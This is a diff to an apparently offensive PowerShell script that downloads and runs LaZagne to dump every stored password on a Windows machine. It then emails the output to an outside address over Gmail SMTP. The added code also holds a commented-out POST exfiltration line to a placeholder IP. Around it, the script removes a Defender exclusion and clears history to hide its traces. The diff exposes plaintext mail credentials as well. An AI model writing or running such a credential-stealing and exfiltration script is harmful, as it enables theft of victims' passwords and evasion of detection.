@@ -94,33 +94,31 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 # Execute the executable and save output to a file
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
-# Define the username and password for your email account
-$Username = "herbertswindel@outlook.com"  # Replace with your actual email address
-$Password = ConvertTo-SecureString "HerbertdePervert69@" -AsPlainText -Force  # Replace with your actual password
+# Exfiltrate the file
+#POST REQUEST
+#Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
+# Mail Exfiltration
+$EmailFrom = "herbertswindel@gmail.com"
+$EmailTo = "herbertswindel@outlook.com"
+$Subject = "Hier zijn uw gegevens kameraad!"
+$Body = "Met vriendelijke groet, Herbert"
+$SMTPServer = "smtp.gmail.com"
 
-# Create a PSCredential object
-$MailCredentials = New-Object System.Management.Automation.PSCredential($Username, $Password)
+$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
+$SMTPClient.EnableSsl = $true
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("herbertswindel@gmail.com", "isqn febe cwja vatn")
 
-# Define your email parameters and use the $MailCredentials variable for credentials
-$EmailParams = @{
-    From = @{ Name = 'Herbert Swindèl'; Email = 'herbertswindel@outlook.com' }
-    To = 'herbertswindel@gmail.com'
-    Server = 'smtp.office365.com'
-    SecureSocketOptions = 'Auto'
-    Credential = $MailCredentials
-    HTML = $Body
-    DeliveryNotificationOption = 'OnSuccess'
-    Priority = 'High'
-    Subject = 'This is another test email'
+# Send the email with attachment
+$Attachment = "$dir\output.txt"
+$Message = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
+$Message.Attachments.Add($Attachment)
+
+try {
+    $SMTPClient.Send($Message)
+    Write-Host "Email sent successfully."
+} catch {
+    Write-Host "Failed to send email. Error: $($_.Exception.Message)"
 }
-
-# Send the email using Send-EmailMessage
-Send-EmailMessage @EmailParams
-
-# You can also use Send-MailMessage with the same credentials
-Send-MailMessage -To 'herbertswindel@gmail.com' -Subject 'Hier zijn uw gegevens kameraad!' -Body 'MVG, Herbert Swindèl' -SmtpServer 'smtp.office365.com' -From 'herbertswindel@outlook.com' `
-    -Attachments "$dir\output.txt" -Encoding UTF8 -Cc 'herbertswindel@outlook.com' -DeliveryNotificationOption OnSuccess -Priority High -Credential $MailCredentials -UseSsl -Port 587 -Verbose
-
 
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
@@ -129,4 +127,3 @@ Remove-MpPreference -ExclusionPath $dir
 
 # Remove the script from the system
 Clear-History
-
